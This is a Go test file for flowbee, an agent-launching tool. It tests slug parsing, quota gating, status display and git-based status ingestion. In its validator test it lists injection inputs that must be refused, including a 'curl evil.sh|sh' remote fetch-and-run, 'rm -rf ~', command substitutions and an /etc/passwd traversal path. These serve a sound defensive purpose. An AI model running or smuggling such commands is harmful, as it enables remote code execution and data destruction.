package main

import (
	"bytes"
	"context"
	"log/slog"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/samhotchkiss/flowbee/internal/capacity"
	"github.com/samhotchkiss/flowbee/internal/gitops"
	"github.com/samhotchkiss/flowbee/internal/store"
	"github.com/samhotchkiss/flowbee/internal/testutil"
)

func TestDeriveSlug(t *testing.T) {
	cases := []struct {
		path    string
		want    string
		wantErr bool
	}{
		{"epics/2026-07-03-frobnicator.md", "2026-07-03-frobnicator", false},
		{"2026-07-03-frobnicator.md", "2026-07-03-frobnicator", false},
		{"epics/not-markdown.txt", "", true},
		// path.Base already neutralizes a directory-traversal path down to its
		// basename — "passwd" is a legitimate-looking (if oddly named) slug, so this
		// is NOT an injection vector; asserted here so a future change to the base-
		// name extraction doesn't silently start leaking path segments into the id.
		{"epics/../../etc/passwd.md", "passwd", false},
		{"epics/bad slug with spaces.md", "", true},
		{"epics/semi;colon.md", "", true},
	}
	for _, c := range cases {
		got, err := deriveSlug(c.path)
		if c.wantErr {
			if err == nil {
				t.Errorf("deriveSlug(%q): expected an error, got %q", c.path, got)
			}
			continue
		}
		if err != nil {
			t.Errorf("deriveSlug(%q): unexpected error %v", c.path, err)
			continue
		}
		if got != c.want {
			t.Errorf("deriveSlug(%q) = %q, want %q", c.path, got, c.want)
		}
	}
}

func TestEpicQuotaGate(t *testing.T) {
	ctx := context.Background()
	now := time.Date(2026, 7, 3, 12, 0, 0, 0, time.UTC)

	t.Run("no accounts enrolled: fail-open", func(t *testing.T) {
		st := testutil.NewStore(t)
		blocked, _, err := epicQuotaGate(ctx, st, "codex", now)
		if err != nil || blocked {
			t.Fatalf("blocked=%v err=%v, want blocked=false", blocked, err)
		}
	})

	t.Run("fresh usage below threshold: not blocked", func(t *testing.T) {
		st := testutil.NewStore(t)
		mustEnrollAccount(t, st, "acct-1", "codex", now)
		mustReportUsage(t, st, "acct-1", "codex", 50, now)
		blocked, _, err := epicQuotaGate(ctx, st, "codex", now)
		if err != nil || blocked {
			t.Fatalf("blocked=%v err=%v, want false", blocked, err)
		}
	})

	t.Run("fresh usage >=75%: blocked", func(t *testing.T) {
		st := testutil.NewStore(t)
		mustEnrollAccount(t, st, "acct-1", "codex", now)
		mustReportUsage(t, st, "acct-1", "codex", 80, now)
		blocked, reason, err := epicQuotaGate(ctx, st, "codex", now)
		if err != nil || !blocked {
			t.Fatalf("blocked=%v err=%v, want true", blocked, err)
		}
		if !strings.Contains(reason, "acct-1") || !strings.Contains(reason, "80%") {
			t.Errorf("reason = %q", reason)
		}
	})

	t.Run("stale (>24h) high usage: fail-open (ignored)", func(t *testing.T) {
		st := testutil.NewStore(t)
		mustEnrollAccount(t, st, "acct-1", "codex", now)
		mustReportUsage(t, st, "acct-1", "codex", 95, now.Add(-25*time.Hour))
		blocked, _, err := epicQuotaGate(ctx, st, "codex", now)
		if err != nil || blocked {
			t.Fatalf("blocked=%v err=%v, want false (stale reading ignored)", blocked, err)
		}
	})

	t.Run("usage over the dispatch ceiling is still just a fresh->blocked reading", func(t *testing.T) {
		st := testutil.NewStore(t)
		mustEnrollAccount(t, st, "acct-1", "codex", now)
		mustReportUsage(t, st, "acct-1", "codex", 95, now) // over the default 90 ceiling too
		blocked, reason, err := epicQuotaGate(ctx, st, "codex", now)
		if err != nil || !blocked {
			t.Fatalf("blocked=%v err=%v, want true", blocked, err)
		}
		if !strings.Contains(reason, "95%") {
			t.Errorf("reason = %q", reason)
		}
	})

	t.Run("stale over-ceiling reading is still ignored (freshness governs, not the ceiling)", func(t *testing.T) {
		st := testutil.NewStore(t)
		mustEnrollAccount(t, st, "acct-1", "codex", now)
		mustReportUsage(t, st, "acct-1", "codex", 99, now.Add(-25*time.Hour))
		blocked, _, err := epicQuotaGate(ctx, st, "codex", now)
		if err != nil || blocked {
			t.Fatalf("blocked=%v err=%v, want false (stale reading ignored even above the dispatch ceiling)", blocked, err)
		}
	})

	t.Run("multiple accounts: only the PRIMARY (lowest preference_rank) gates", func(t *testing.T) {
		st := testutil.NewStore(t)
		if err := st.UpsertAccounts(ctx, []store.AccountSpec{
			{AccountID: "primary", ModelFamily: "codex", CeilingPct: 90, PreferenceRank: 0},
			{AccountID: "fallback", ModelFamily: "codex", CeilingPct: 90, PreferenceRank: 1},
		}, now); err != nil {
			t.Fatalf("enroll: %v", err)
		}
		// the fallback is nearly maxed, but the primary (what a launch would actually
		// start consuming) is nowhere near the threshold — must NOT block.
		mustReportUsage(t, st, "primary", "codex", 10, now)
		mustReportUsage(t, st, "fallback", "codex", 99, now)
		blocked, _, err := epicQuotaGate(ctx, st, "codex", now)
		if err != nil || blocked {
			t.Fatalf("blocked=%v err=%v, want false (only the primary account gates)", blocked, err)
		}
	})

	t.Run("different agent's accounts don't gate this agent: fail-open", func(t *testing.T) {
		st := testutil.NewStore(t)
		mustEnrollAccount(t, st, "acct-1", "claude", now)
		mustReportUsage(t, st, "acct-1", "claude", 99, now)
		blocked, _, err := epicQuotaGate(ctx, st, "codex", now)
		if err != nil || blocked {
			t.Fatalf("blocked=%v err=%v, want false (codex has no enrolled accounts)", blocked, err)
		}
	})
}

func mustEnrollAccount(t *testing.T, st *store.Store, accountID, modelFamily string, now time.Time) {
	t.Helper()
	if err := st.UpsertAccounts(context.Background(), []store.AccountSpec{
		{AccountID: accountID, ModelFamily: modelFamily, CeilingPct: 90, PreferenceRank: 0},
	}, now); err != nil {
		t.Fatalf("enroll account: %v", err)
	}
}

func mustReportUsage(t *testing.T, st *store.Store, accountID, modelFamily string, pct int, reportedAt time.Time) {
	t.Helper()
	if _, err := st.RecordUsage(context.Background(), []capacity.UsageReport{
		{AccountID: accountID, ModelFamily: modelFamily, UsagePct: pct},
	}, reportedAt); err != nil {
		t.Fatalf("record usage: %v", err)
	}
}

func TestPrintEpicStatus(t *testing.T) {
	var buf bytes.Buffer
	printEpicStatus(&buf, nil, nil, time.Now())
	if !strings.Contains(buf.String(), "no epics registered") {
		t.Fatalf("expected empty-registry message, got:\n%s", buf.String())
	}

	buf.Reset()
	now := time.Date(2026, 7, 3, 12, 0, 0, 0, time.UTC)
	epics := []store.EpicRun{
		{
			ID: "2026-07-03-frob", Title: "Frobnicate the whole subsystem end to end", Repo: "russ",
			Host: "buncher", TmuxName: "epic-2026-07-03-frob", State: "running",
			StatusCurrentStep: 2, StatusStepsTotal: 5, StatusBlockers: "",
			StatusUpdatedAt: now.Add(-10 * time.Minute).Format(time.RFC3339),
		},
		{
			ID: "2026-07-01-x", Title: "X", Repo: "russ", Host: "imac", TmuxName: "epic-2026-07-01-x",
			State: "blocked", StatusBlockers: "needs gh auth",
		},
	}
	sessions := map[string]store.GoalSession{
		"epic-2026-07-03-frob": {ID: "epic-2026-07-03-frob", State: "working", Enabled: true},
		"epic-2026-07-01-x":    {ID: "epic-2026-07-01-x", State: "blocked", Enabled: false},
	}
	printEpicStatus(&buf, epics, sessions, now)
	out := buf.String()
	for _, want := range []string{
		"2026-07-03-frob", "Frobnicate", "buncher", "working", "2/5", "running",
		"2026-07-01-x", "blocked", "needs gh auth", "[paused]", "10m0s ago",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("expected output to contain %q, got:\n%s", want, out)
		}
	}
}

// ── status ingestion (fixture mirror) ──

func mustExec(t *testing.T, dir, name string, args ...string) {
	t.Helper()
	cmd := exec.Command(name, args...)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("%s %v: %v\n%s", name, args, err, out)
	}
}

func mustWriteFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// TestIngestEpicStatuses drives the real ingestion function against a fixture
// mirror (a local bare "origin" repo + the control-plane mirror cloned from it),
// mirroring internal/gitops's own newFixture pattern (temp git repos, no network).
// Exercises: (1) the happy path — a pushed epic/<slug> branch's ## Status is
// parsed and folded into the epics row; (2) "never fail the loop on one epic's
// parse error" — a second active epic whose repo isn't even registered must not
// prevent the first from ingesting.
func TestIngestEpicStatuses(t *testing.T) {
	root := t.TempDir()
	origin := filepath.Join(root, "origin.git")
	if _, err := gitops.InitBare(origin); err != nil {
		t.Fatalf("init bare origin: %v", err)
	}

	seed := filepath.Join(root, "seed")
	mustExec(t, root, "git", "clone", origin, seed)
	mustWriteFile(t, filepath.Join(seed, "README.md"), "hello\n")
	mustExec(t, seed, "git", "-c", "user.email=t@t", "-c", "user.name=t", "add", "-A")
	mustExec(t, seed, "git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-m", "init")
	mustExec(t, seed, "git", "branch", "-M", "main")
	mustExec(t, seed, "git", "push", "origin", "main")

	// the epic branch: push epics/2026-07-03-frob.md with a real ## Status section.
	mustExec(t, seed, "git", "checkout", "-b", "epic/2026-07-03-frob")
	epicContent := "---\ntitle: Frob\nscope:\n  - internal/frob/**\n---\n## Status\n" +
		"Updated: 2026-07-03T11:50:00Z · Current: step 2/5 · State: blocked\n" +
		"- [x] Step 1 — a (evidence: ok)\n- [ ] Step 2 — b\nBlockers: needs gh auth\n"
	mustWriteFile(t, filepath.Join(seed, "epics", "2026-07-03-frob.md"), epicContent)
	mustExec(t, seed, "git", "-c", "user.email=t@t", "-c", "user.name=t", "add", "-A")
	mustExec(t, seed, "git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-m", "status update")
	mustExec(t, seed, "git", "push", "origin", "epic/2026-07-03-frob")

	mirrorPath := filepath.Join(root, "mirror.git")
	if err := gitops.CloneBareMirror(mirrorPath, origin); err != nil {
		t.Fatalf("clone control mirror: %v", err)
	}
	t.Setenv("FLOWBEE_MIRROR_PATH", mirrorPath)

	st := testutil.NewStore(t)
	ctx := context.Background()
	now := time.Date(2026, 7, 3, 12, 0, 0, 0, time.UTC)

	if err := st.RegisterRepo(ctx, store.Repo{ID: "default", Owner: "acme", Repo: "proj", DefaultBranch: "main", Active: true}); err != nil {
		t.Fatalf("register repo: %v", err)
	}
	if err := st.AddEpicRun(ctx, store.EpicRun{
		ID: "2026-07-03-frob", Repo: "default", FilePath: "epics/2026-07-03-frob.md",
		Branch: "epic/2026-07-03-frob", TmuxName: "epic-2026-07-03-frob",
	}, now); err != nil {
		t.Fatalf("add epic run: %v", err)
	}
	if err := st.MarkEpicLaunched(ctx, "2026-07-03-frob", now); err != nil {
		t.Fatalf("mark launched: %v", err)
	}

	// a SECOND active epic pointing at an unregistered repo — must be skipped
	// without blocking ingestion of the first.
	if err := st.AddEpicRun(ctx, store.EpicRun{
		ID: "2026-07-03-ghost", Repo: "no-such-repo", FilePath: "epics/2026-07-03-ghost.md",
		Branch: "epic/2026-07-03-ghost", TmuxName: "epic-2026-07-03-ghost",
	}, now); err != nil {
		t.Fatalf("add ghost epic run: %v", err)
	}
	if err := st.MarkEpicLaunched(ctx, "2026-07-03-ghost", now); err != nil {
		t.Fatalf("mark ghost launched: %v", err)
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	ingestEpicStatuses(ctx, logger, st, now)

	e, err := st.GetEpicRun(ctx, "2026-07-03-frob")
	if err != nil {
		t.Fatalf("get epic run: %v", err)
	}
	if e.State != "blocked" {
		t.Fatalf("expected state=blocked after ingestion, got %q (full row: %+v)", e.State, e)
	}
	if e.StatusCurrentStep != 2 || e.StatusStepsTotal != 5 {
		t.Fatalf("expected step 2/5, got %d/%d", e.StatusCurrentStep, e.StatusStepsTotal)
	}
	if e.StatusBlockers != "needs gh auth" {
		t.Fatalf("blockers = %q", e.StatusBlockers)
	}
	if len(e.StatusChecklist) != 2 || !e.StatusChecklist[0].Checked || e.StatusChecklist[1].Checked {
		t.Fatalf("checklist not ingested correctly: %+v", e.StatusChecklist)
	}

	// the ghost epic's row must be untouched (no status fields populated) — it was
	// skipped, not errored-into-a-half-write.
	ghost, err := st.GetEpicRun(ctx, "2026-07-03-ghost")
	if err != nil {
		t.Fatalf("get ghost epic run: %v", err)
	}
	if ghost.StatusStateDetail != "" || ghost.State != "running" {
		t.Fatalf("expected the ghost epic untouched, got %+v", ghost)
	}
}

// TestIngestEpicStatuses_MissingBranchIsNotAnError covers the "branch may not
// exist yet in the first minutes" case (§ task brief point 4): FetchBranch fails
// because the epic branch was never pushed, and ingestion must simply skip it,
// not error the whole pass.
func TestIngestEpicStatuses_MissingBranchIsNotAnError(t *testing.T) {
	root := t.TempDir()
	origin := filepath.Join(root, "origin.git")
	if _, err := gitops.InitBare(origin); err != nil {
		t.Fatalf("init bare origin: %v", err)
	}
	seed := filepath.Join(root, "seed")
	mustExec(t, root, "git", "clone", origin, seed)
	mustWriteFile(t, filepath.Join(seed, "README.md"), "hello\n")
	mustExec(t, seed, "git", "-c", "user.email=t@t", "-c", "user.name=t", "add", "-A")
	mustExec(t, seed, "git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-m", "init")
	mustExec(t, seed, "git", "branch", "-M", "main")
	mustExec(t, seed, "git", "push", "origin", "main")

	mirrorPath := filepath.Join(root, "mirror.git")
	if err := gitops.CloneBareMirror(mirrorPath, origin); err != nil {
		t.Fatalf("clone control mirror: %v", err)
	}
	t.Setenv("FLOWBEE_MIRROR_PATH", mirrorPath)

	st := testutil.NewStore(t)
	ctx := context.Background()
	now := time.Now()
	if err := st.RegisterRepo(ctx, store.Repo{ID: "default", Owner: "acme", Repo: "proj", DefaultBranch: "main", Active: true}); err != nil {
		t.Fatalf("register repo: %v", err)
	}
	if err := st.AddEpicRun(ctx, store.EpicRun{
		ID: "e1", Repo: "default", FilePath: "epics/e1.md", Branch: "epic/e1", TmuxName: "epic-e1",
	}, now); err != nil {
		t.Fatalf("add epic run: %v", err)
	}
	if err := st.MarkEpicLaunched(ctx, "e1", now); err != nil {
		t.Fatalf("mark launched: %v", err)
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	ingestEpicStatuses(ctx, logger, st, now) // must not panic or error the pass

	e, err := st.GetEpicRun(ctx, "e1")
	if err != nil {
		t.Fatalf("get epic run: %v", err)
	}
	if e.State != "running" || e.StatusStateDetail != "" {
		t.Fatalf("expected the epic untouched (branch absent), got %+v", e)
	}
}

// TestValidateAgent is the M2 regression test: the agent name can come FROM THE
// EPIC FILE (frontmatter agent:) and becomes the tmux session's shell-executed
// start command on the target box — every shell-metacharacter form of the
// "codex; curl …|sh" RCE shape must be refused before it can reach
// watchdog.NewTmuxSessionCmd.
func TestValidateAgent(t *testing.T) {
	for _, ok := range []string{"codex", "claude", "my-agent_v2", "codex.sh", "Codex-2"} {
		if err := validateAgent(ok); err != nil {
			t.Errorf("validateAgent(%q): unexpected refusal: %v", ok, err)
		}
	}
	for _, bad := range []string{
		"codex; curl evil.sh|sh",
		"codex && rm -rf ~",
		"codex $(whoami)",
		"codex `id`",
		"codex --dangerously-skip-checks", // spaces = arguments: wrapper-script territory
		"/usr/local/bin/codex",            // path slashes are refused too (must be on PATH)
		"codex\nrm -rf ~",
		"codex|tee",
		"'codex'",
		"",
	} {
		if err := validateAgent(bad); err == nil {
			t.Errorf("validateAgent(%q): expected refusal, got nil", bad)
		}
	}
}
